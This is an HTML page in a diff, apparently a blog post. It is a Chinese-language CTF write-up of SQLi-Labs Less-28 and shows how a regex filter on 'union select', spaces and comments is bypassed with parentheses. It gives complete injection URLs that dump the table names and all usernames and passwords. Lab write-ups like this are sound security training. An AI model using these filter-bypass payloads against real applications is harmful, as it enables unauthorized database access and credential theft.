@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-28 正则拦截与括号绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-28 正则拦截与括号绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 绕过过滤, 联合查询</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-28 (GET - Trick with SELECT & UNION)</li>
+        <li><strong>提示：</strong>过滤了带空格的 union select 组合、空格及注释符，单引号加括号闭合。</li>
+    </ul>
+
+    <h2>2. 核心原理与绕过策略</h2>
+    <p>本关卡的防御机制不同于前几关的“无脑拉黑关键字”，而是使用了精确的正则表达式：</p>
+    <ul>
+        <li><strong>正则拦截</strong>：匹配 <code>union\s+select</code>（即当 union 和 select 之间存在空格、换行等空白符时才会被拦截）。</li>
+        <li><strong>空格与注释符被封杀</strong>：传统的空格和 <code>#</code>、<code>--</code> 无法使用。</li>
+        <li><strong>闭合方式</strong>：后台 SQL 为 <code>id=('$id')</code>，需使用 <code>')</code> 闭合。</li>
+    </ul>
+    <p><strong>绕过策略：</strong></p>
+    <ul>
+        <li><strong>括号代替空格</strong>：直接将 Payload 写成 <code>union(select...)</code>。词法解析器遇到括号会自动切断 Token，完美规避 <code>union\s+select</code> 的正则匹配。</li>
+        <li><strong>对称闭合</strong>：在 Payload 末尾使用 <code>||'</code> 与后台原本的 <code>') LIMIT 0,1</code> 缝合，形成合法的空字符串。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：爆库名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0')union(select(1),database(),3||'</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>security</code>。</p>
+
+    <p><strong>第二步：爆表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0')union(select(1),group_concat(table_name),(3)from(information_schema.tables)where(table_schema=database())||'</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>emails,referrers,uagents,users</code>。</p>
+    <p><em>注：由于 <code>from</code> 后面不能有空格，使用 <code>)from(</code> 进行分隔。</em></p>
+
+    <p><strong>第三步：直接脱库</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0')union(select(1),group_concat(username,0x3a,password),(3)from(users)where(1=1)||'</code></p>
+    <p><strong>回显现象：</strong>成功爆出所有账号和密码，包含 <code>admin:p@ssw0rd</code>。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>对正则的逆向思维</strong>：针对 <code>union\s+select</code> 的正则，最好的绕过方式不是换空格，而是彻底不要空格。</li>
+        <li><strong>闭合符的精准匹配</strong>：必须用 <code>')</code> 闭合，尾部必须用 <code>||'</code> 缝合，任何符号的错位都会导致语法崩溃。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>正则绕过</strong>：利用括号 <code>()</code> 阻断空白字符的匹配。</li>
+        <li><strong>词法边界</strong>：深刻理解标点符号在 SQL 解析中的切分作用。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
